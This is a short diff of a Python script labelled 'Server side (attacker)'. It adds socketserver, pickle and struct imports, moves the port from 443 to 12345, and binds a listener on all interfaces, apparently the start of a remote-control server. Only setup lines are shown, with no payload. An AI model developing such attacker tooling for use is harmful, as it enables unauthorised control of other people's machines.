@@ -1,8 +1,12 @@
 # Server side (attacker)
 import socket
+import socketserver
+import pickle
+import struct
+import logging
 
 host = "0.0.0.0"
-port = 443
+port = 12345
 
 server = socket.socket()
 server.bind((host, port))
